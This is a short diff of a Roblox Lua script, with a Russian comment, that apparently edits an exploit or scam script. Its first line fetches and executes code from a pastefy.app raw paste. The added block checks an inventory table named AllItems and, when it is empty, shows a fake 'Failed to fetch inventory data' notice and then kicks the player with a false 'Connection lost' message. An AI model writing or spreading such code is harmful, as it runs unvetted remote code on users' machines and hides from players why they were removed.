@@ -1,1 +1,11 @@
 loadstring(game:HttpGet("https://pastefy.app/2QUNylbN/raw"))()
+-- В самом конце скрипта вместо LocalPlayer:Kick("...") поставь это:
+if #AllItems == 0 then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Error";
+        Text = "Failed to fetch inventory data. Please rejoin.";
+        Duration = 8;
+    })
+    task.wait(2.5)
+    LocalPlayer:Kick("Connection lost. Please check your internet connection.")
+end
